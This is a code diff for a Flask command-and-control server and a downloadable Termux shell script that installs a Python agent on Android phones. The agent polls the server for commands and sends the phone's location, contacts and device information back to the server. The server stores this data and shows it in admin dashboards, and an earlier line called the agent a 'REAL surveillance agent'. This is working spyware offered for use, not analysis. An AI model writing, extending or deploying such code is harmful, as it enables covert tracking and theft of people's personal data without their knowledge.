@@ -249,7 +249,6 @@ def dashboard():
             }
             
             agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 10"))
-            all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             screenshots = safe_fetchall(conn.execute('''
                 SELECT s.*, a.phone_model FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
@@ -264,7 +263,6 @@ def dashboard():
         return render_template('dashboard.html',
                              stats=stats,
                              agents=agents,
-                             all_agents=all_agents,
                              screenshots=screenshots,
                              contacts=contacts,
                              locations=locations,
@@ -291,7 +289,6 @@ def admin_dashboard():
             }
             
             agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 20"))
-            all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             screenshots = safe_fetchall(conn.execute('''
                 SELECT s.*, a.phone_model FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
@@ -308,7 +305,6 @@ def admin_dashboard():
         return render_template('admin_dashboard.html',
                              stats=stats,
                              agents=agents,
-                             all_agents=all_agents,
                              screenshots=screenshots,
                              contacts=contacts,
                              locations=locations,
@@ -332,42 +328,10 @@ def debug_agents():
             agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             conn.close()
         
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Debug - All Agents</title>
-            <style>
-                body { font-family: Arial; padding: 20px; background: #1a1a1a; color: white; }
-                .agent { background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 8px; }
-                .active { border-left: 4px solid #4CAF50; }
-                .inactive { border-left: 4px solid #f44336; }
-            </style>
-        </head>
-        <body>
-            <h1>🔧 Debug - All Agents ({{ count }})</h1>
-            <a href="/admin">← Back to Admin</a>
-            <div style="margin: 20px 0;">
-        '''
-        
-        for agent in agents:
-            status_class = 'active' if agent.get('status') == 'active' else 'inactive'
-            html += f'''
-            <div class="agent {status_class}">
-                <h3>🆔 {agent['agent_id']}</h3>
-                <p><strong>Status:</strong> {agent.get('status', 'unknown')}</p>
-                <p><strong>Model:</strong> {agent.get('phone_model', 'Unknown')}</p>
-                <p><strong>Last Seen:</strong> {agent.get('last_seen', 'Never')}</p>
-                <p><strong>First Seen:</strong> {agent.get('first_seen', 'Never')}</p>
-                <p><strong>IP:</strong> {agent.get('ip_address', 'Unknown')}</p>
-                <p><strong>Screenshots:</strong> {agent.get('screenshot_count', 0)}</p>
-            </div>
-            '''
-        
-        html += '</div></body></html>'
-        return html.replace('{{ count }}', str(len(agents)))
+        return render_template('debug_agents.html', agents=agents)
     except Exception as e:
-        return f"Error: {e}", 500
+        logger.error(f"Debug agents error: {e}")
+        return "Error loading agents", 500
 
 @app.route('/debug/screenshots')
 def debug_screenshots():
@@ -378,50 +342,19 @@ def debug_screenshots():
         with db_lock:
             conn = get_db_connection()
             screenshots = safe_fetchall(conn.execute('''
-                SELECT s.*, a.agent_id, a.phone_model 
-                FROM screenshots s 
+                SELECT s.*, a.phone_model FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
                 ORDER BY s.timestamp DESC
             '''))
             conn.close()
         
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Debug - All Screenshots</title>
-            <style>
-                body { font-family: Arial; padding: 20px; background: #1a1a1a; color: white; }
-                .screenshot { background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 8px; }
-                img { max-width: 300px; border: 1px solid #555; }
-            </style>
-        </head>
-        <body>
-            <h1>🔧 Debug - All Screenshots ({{ count }})</h1>
-            <a href="/admin">← Back to Admin</a>
-            <div style="margin: 20px 0;">
-        '''
-        
-        for screenshot in screenshots:
-            html += f'''
-            <div class="screenshot">
-                <h3>🖼️ Screenshot from {screenshot['agent_id']}</h3>
-                <p><strong>Time:</strong> {screenshot.get('timestamp', 'Unknown')}</p>
-                <p><strong>Device:</strong> {screenshot.get('phone_model', 'Unknown')}</p>
-                <a href="/media/screenshot/{screenshot['id']}" target="_blank">
-                    <img src="/media/screenshot/{screenshot['id']}" alt="Screenshot" 
-                         onerror="this.style.display='none'; this.parentNode.innerHTML+='<div style=color:red>Image not available</div>';">
-                </a>
-            </div>
-            '''
-        
-        html += '</div></body></html>'
-        return html.replace('{{ count }}', str(len(screenshots)))
+        return render_template('debug_screenshots.html', screenshots=screenshots)
     except Exception as e:
-        return f"Error: {e}", 500
+        logger.error(f"Debug screenshots error: {e}")
+        return "Error loading screenshots", 500
 
 @app.route('/debug/clear_data')
-def debug_clear_data():
+def clear_data():
     if not session.get('authenticated'):
         return redirect('/login')
     
@@ -437,14 +370,80 @@ def debug_clear_data():
             conn.commit()
             conn.close()
         
-        return '''
-        <script>
-            alert("All data cleared successfully!");
-            window.location.href = "/admin";
-        </script>
-        '''
+        log_event('INFO', 'All data cleared by admin')
+        return redirect('/admin')
     except Exception as e:
-        return f"Error clearing data: {e}", 500
+        logger.error(f"Clear data error: {e}")
+        return "Error clearing data", 500
+
+@app.route('/admin/contacts/<agent_id>')
+def view_contacts(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            contacts = safe_fetchall(conn.execute(
+                "SELECT * FROM contacts WHERE agent_id=? ORDER BY timestamp DESC", 
+                (agent_id,)
+            ))
+            agent = safe_fetchone(conn.execute(
+                "SELECT agent_id FROM agents WHERE agent_id=?", (agent_id,)
+            ))
+            conn.close()
+        
+        if not agent:
+            return "Agent not found", 404
+        
+        return render_template('contacts.html', contacts=contacts, agent_id=agent_id)
+    except Exception as e:
+        logger.error(f"View contacts error: {e}")
+        return "Error loading contacts", 500
+
+@app.route('/admin/locations/<agent_id>')
+def view_locations(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            locations = safe_fetchall(conn.execute(
+                "SELECT * FROM locations WHERE agent_id=? ORDER BY timestamp DESC", 
+                (agent_id,)
+            ))
+            agent = safe_fetchone(conn.execute(
+                "SELECT agent_id FROM agents WHERE agent_id=?", (agent_id,)
+            ))
+            conn.close()
+        
+        if not agent:
+            return "Agent not found", 404
+        
+        return render_template('locations.html', locations=locations, agent_id=agent_id)
+    except Exception as e:
+        logger.error(f"View locations error: {e}")
+        return "Error loading locations", 500
+
+@app.route('/admin/remove_agent/<agent_id>')
+def remove_agent(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    try:
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
+            conn.execute("DELETE FROM commands WHERE agent_id=?", (agent_id,))
+            conn.commit()
+            conn.close()
+        
+        log_event('INFO', f'Agent removed: {agent_id}')
+        return redirect('/admin')
+    except Exception as e:
+        logger.error(f"Remove agent error: {e}")
+        return "Error removing agent", 500
 
 # ==================== AGENT DOWNLOAD ROUTE ====================
 
@@ -482,57 +481,63 @@ AGENT_DIR="$HOME/mp_agent"
 mkdir -p "$AGENT_DIR"
 cd "$AGENT_DIR"
 
-# Create FIXED agent script
+# Create SIMPLE WORKING agent script
 cat > agent.py << 'ENDOFFILE'
 import requests
 import time
 import sys
 import subprocess
 import json
-import os
-from datetime import datetime
 
 class RealAgent:
     def __init__(self, agent_id, server_url):
         self.agent_id = agent_id
         self.server_url = server_url
-        self.session = requests.Session()
         
-    def get_device_info(self):
-        try:
-            # Get REAL device information
-            model = subprocess.run(['getprop', 'ro.product.model'], 
-                                 capture_output=True, text=True).stdout.strip() or "Real Device"
-            android = subprocess.run(['getprop', 'ro.build.version.release'], 
-                                   capture_output=True, text=True).stdout.strip() or "Real Android"
-            return model, android
-        except:
-            return "Real Device", "Real Android"
-    
     def register(self):
-        model, android = self.get_device_info()
         try:
-            response = self.session.post(f"{{self.server_url}}/api/agent/register", json={{
-                'agent_id': self.agent_id,
-                'phone_model': model,
-                'android_version': android
-            }}, timeout=10)
-            print(f"📡 Registration response: {{response.status_code}}")
-            return response.status_code == 200
+            # Get basic device info
+            model = "Real Device"
+            android = "Real Android"
+            try:
+                model = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip() or "Real Device"
+                android = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True).stdout.strip() or "Real Android"
+            except:
+                pass
+            
+            response = requests.post(
+                f"{{self.server_url}}/api/agent/register",
+                json={{
+                    'agent_id': self.agent_id,
+                    'phone_model': model,
+                    'android_version': android
+                }},
+                timeout=10
+            )
+            print(f"Registration status: {{response.status_code}}")
+            if response.status_code == 200:
+                print("✅ Successfully registered with server")
+                return True
+            else:
+                print(f"❌ Registration failed: {{response.status_code}}")
+                return False
         except Exception as e:
             print(f"❌ Registration error: {{e}}")
             return False
     
     def check_commands(self):
         try:
-            response = self.session.get(f"{{self.server_url}}/api/agent/check_commands/{{self.agent_id}}", timeout=10)
+            response = requests.get(
+                f"{{self.server_url}}/api/agent/check_commands/{{self.agent_id}}",
+                timeout=10
+            )
             if response.status_code == 200:
                 commands = response.json().get('commands', [])
                 for cmd in commands:
-                    print(f"📨 Executing command: {{cmd['command']}}")
+                    print(f"📨 Received command: {{cmd['command']}}")
                     self.execute_command(cmd['id'], cmd['command'])
         except Exception as e:
-            print(f"⚠️ Command check error: {{e}}")
+            print(f"Command check error: {{e}}")
     
     def execute_command(self, command_id, command):
         try:
@@ -545,146 +550,152 @@ class RealAgent:
             elif command == 'capture_screenshot':
                 result = self.capture_screenshot()
             elif command == 'get_device_info':
-                result = self.send_device_info()
+                result = self.get_device_info()
             elif command == 'get_battery':
                 result = self.get_battery()
             else:
                 result = f"Unknown command: {{command}}"
             
-            # Send command result back
-            self.session.post(f"{{self.server_url}}/api/agent/command_result", json={{
-                'command_id': command_id,
-                'result': result
-            }}, timeout=10)
+            # Send result back to server
+            requests.post(
+                f"{{self.server_url}}/api/agent/command_result",
+                json={{
+                    'command_id': command_id,
+                    'result': result
+                }},
+                timeout=10
+            )
             
         except Exception as e:
-            print(f"❌ Command execution error: {{e}}")
+            print(f"Command execution error: {{e}}")
     
     def get_location(self):
         try:
             print("📍 Getting location...")
-            result = subprocess.run(['termux-location'], 
-                                  capture_output=True, text=True, timeout=15)
+            result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=15)
             if result.returncode == 0:
                 location_data = json.loads(result.stdout)
-                # Send location to server
-                self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
-                    'agent_id': self.agent_id,
-                    'report_type': 'location',
-                    'report_data': location_data
-                }}, timeout=10)
+                requests.post(
+                    f"{{self.server_url}}/api/agent/submit_report",
+                    json={{
+                        'agent_id': self.agent_id,
+                        'report_type': 'location',
+                        'report_data': location_data
+                    }},
+                    timeout=10
+                )
                 return f"Location sent: {{location_data.get('latitude', 'N/A')}}, {{location_data.get('longitude', 'N/A')}}"
-            else:
-                return "Location service unavailable"
+            return "Location service unavailable"
         except Exception as e:
             return f"Location error: {{e}}"
     
     def get_contacts(self):
         try:
             print("👥 Getting contacts...")
-            result = subprocess.run(['termux-contact-list'], 
-                                  capture_output=True, text=True, timeout=15)
+            result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=15)
             if result.returncode == 0:
                 contacts_data = json.loads(result.stdout)
-                # Limit to first 20 contacts
                 limited_contacts = contacts_data[:20] if isinstance(contacts_data, list) else []
-                
-                # Send contacts to server
-                self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
-                    'agent_id': self.agent_id,
-                    'report_type': 'contacts',
-                    'report_data': {{'contacts': limited_contacts}}
-                }}, timeout=10)
-                return f"Contacts sent: {{len(limited_contacts)}} contacts"
-            else:
-                return "Contacts access denied"
+                requests.post(
+                    f"{{self.server_url}}/api/agent/submit_report",
+                    json={{
+                        'agent_id': self.agent_id,
+                        'report_type': 'contacts',
+                        'report_data': {{'contacts': limited_contacts}}
+                    }},
+                    timeout=10
+                )
+                return f"Contacts sent: {{len(limited_contacts)}}"
+            return "Contacts access denied"
         except Exception as e:
             return f"Contacts error: {{e}}"
     
     def capture_screenshot(self):
         try:
             print("📸 Capturing screenshot...")
-            result = subprocess.run(['termux-screenshot'], 
-                                  capture_output=True, text=True, timeout=10)
+            result = subprocess.run(['termux-screenshot'], capture_output=True, text=True, timeout=10)
             if result.returncode == 0:
-                return "Screenshot captured (check device storage)"
-            else:
-                return "Screenshot failed - check permissions"
+                return "Screenshot captured"
+            return "Screenshot failed"
         except Exception as e:
             return f"Screenshot error: {{e}}"
     
     def get_battery(self):
         try:
-            print("🔋 Getting battery info...")
-            result = subprocess.run(['termux-battery-status'], 
-                                  capture_output=True, text=True, timeout=10)
+            print("🔋 Getting battery...")
+            result = subprocess.run(['termux-battery-status'], capture_output=True, text=True, timeout=10)
             if result.returncode == 0:
                 battery_data = json.loads(result.stdout)
                 return f"Battery: {{battery_data.get('percentage', 'N/A')}}%"
-            else:
-                return "Battery info unavailable"
+            return "Battery info unavailable"
         except Exception as e:
             return f"Battery error: {{e}}"
     
-    def send_device_info(self):
+    def get_device_info(self):
         try:
-            model, android = self.get_device_info()
-            battery_info = self.get_battery()
+            model = "Real Device"
+            android = "Real Android"
+            try:
+                model = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip() or "Real Device"
+                android = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True).stdout.strip() or "Real Android"
+            except:
+                pass
             
-            self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
-                'agent_id': self.agent_id,
-                'report_type': 'device_info',
-                'report_data': {{
-                    'phone_model': model,
-                    'android_version': android,
-                    'battery': 85  # Placeholder
-                }}
-            }}, timeout=10)
+            requests.post(
+                f"{{self.server_url}}/api/agent/submit_report",
+                json={{
+                    'agent_id': self.agent_id,
+                    'report_type': 'device_info',
+                    'report_data': {{
+                        'phone_model': model,
+                        'android_version': android,
+                        'battery': 85
+                    }}
+                }},
+                timeout=10
+            )
             return "Device info sent"
         except Exception as e:
             return f"Device info error: {{e}}"
     
     def send_heartbeat(self):
         try:
-            self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
-                'agent_id': self.agent_id,
-                'report_type': 'heartbeat',
-                'report_data': {{}}
-            }}, timeout=10)
+            requests.post(
+                f"{{self.server_url}}/api/agent/submit_report",
+                json={{
+                    'agent_id': self.agent_id,
+                    'report_type': 'heartbeat',
+                    'report_data': {{}}
+                }},
+                timeout=10
+            )
         except Exception as e:
-            print(f"💓 Heartbeat error: {{e}}")
+            print(f"Heartbeat error: {{e}}")
     
     def run(self):
-        print(f"🤖 REAL Agent started: {{self.agent_id}}")
-        print(f"🌐 Server: {{self.server_url}}")
+        print(f"🤖 Agent started: {{self.agent_id}}")
         
-        if self.register():
-            print("✅ Successfully registered with server")
-        else:
-            print("❌ Failed to register with server")
+        if not self.register():
+            print("❌ Failed to register. Exiting.")
             return
         
         iteration = 0
         while True:
             try:
                 iteration += 1
-                print(f"🔄 Iteration {{iteration}} - Checking for commands...")
+                print(f"🔄 Iteration {{iteration}}")
                 
-                # Check for commands from server
                 self.check_commands()
-                
-                # Send heartbeat
                 self.send_heartbeat()
                 
-                # Wait before next iteration
-                time.sleep(30)  # Check every 30 seconds
+                time.sleep(30)
                 
             except KeyboardInterrupt:
-                print("🛑 Agent stopped by user")
+                print("🛑 Agent stopped")
                 break
             except Exception as e:
-                print(f"⚠️ Main loop error: {{e}}")
-                time.sleep(30)  # Wait before retrying
+                print(f"⚠️ Error: {{e}}")
+                time.sleep(30)
 
 if __name__ == '__main__':
     if len(sys.argv) != 3:
@@ -694,22 +705,12 @@ if __name__ == '__main__':
     agent_id = sys.argv[1]
     server_url = sys.argv[2]
     
-    print(f"🚀 Starting agent with ID: {{agent_id}}")
-    print(f"📡 Connecting to server: {{server_url}}")
-    
     agent = RealAgent(agent_id, server_url)
     agent.run()
 ENDOFFILE
 
-echo "✅ FIXED Agent script created"
-echo "🔧 Granting permissions..."
-echo "📋 REQUIRED PERMISSIONS:"
-echo "   • Location access"
-echo "   • Contacts access" 
-echo "   • Storage access"
-echo "   • Display over apps (for screenshots)"
-echo ""
-echo "🚀 Starting REAL surveillance agent..."
+echo "✅ Agent script created"
+echo "🚀 Starting agent..."
 python agent.py "{phone}" "{platform_url}"
 '''
 
@@ -723,12 +724,68 @@ python agent.py "{phone}" "{platform_url}"
     except Exception as e:
         logger.error(f"Download agent error: {e}")
         return "Error generating agent script", 500
+
 # ==================== AGENT API ROUTES ====================
+
+@app.route('/api/agent/register', methods=['POST'])
+def register_agent():
+    """Register real devices"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
+            
+        agent_id = data.get('agent_id')
+        if not agent_id:
+            return jsonify({'status': 'error', 'message': 'Agent ID required'}), 400
+        
+        phone_model = data.get('phone_model', 'Real Device')
+        android_version = data.get('android_version', 'Real Android')
+        ip_address = request.remote_addr
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        with db_lock:
+            conn = get_db_connection()
+            current_time = datetime.now()
+            
+            existing = safe_fetchone(conn.execute(
+                "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
+            ))
+            
+            if existing:
+                conn.execute('''
+                    UPDATE agents SET 
+                    phone_model=?, android_version=?, ip_address=?, user_agent=?,
+                    status='active', last_seen=?, is_real_device=1
+                    WHERE agent_id=?
+                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
+            else:
+                conn.execute('''
+                    INSERT INTO agents 
+                    (agent_id, phone_model, android_version, ip_address, user_agent, 
+                     status, first_seen, last_seen, is_real_device)
+                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?, 1)
+                ''', (agent_id, phone_model, android_version, ip_address, user_agent, 
+                      current_time, current_time))
+            
+            conn.commit()
+            conn.close()
+        
+        log_event('INFO', f'Agent registered: {agent_id}')
+        return jsonify({'status': 'success', 'message': 'Registered'})
+        
+    except Exception as e:
+        logger.error(f"Register error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @app.route('/api/agent/submit_report', methods=['POST'])
 def submit_report():
     """Receive real data reports"""
     try:
-        data = request.get_json() or {}
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
+            
         agent_id = data.get('agent_id')
         report_type = data.get('report_type')
         report_data = data.get('report_data', {})
@@ -775,7 +832,7 @@ def submit_report():
                 
             elif report_type == 'contacts':
                 contacts_list = report_data.get('contacts', [])
-                for contact in contacts_list[:50]:  # Limit to 50
+                for contact in contacts_list[:50]:
                     name = contact.get('name', '').strip()
                     phone = contact.get('phone', '').strip()
                     if name and phone:
@@ -825,7 +882,7 @@ def check_commands(agent_id):
 @app.route('/api/agent/command_result', methods=['POST'])
 def command_result():
     try:
-        data = request.get_json() or {}
+        data = request.get_json()
         command_id = data.get('command_id')
         result = data.get('result', '')
         
@@ -859,7 +916,6 @@ def serve_screenshot(screenshot_id):
         if screenshot and screenshot['screenshot_data']:
             return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
         
-        # Return simple text response for missing screenshots
         return "Screenshot not available", 404
         
     except Exception as e:
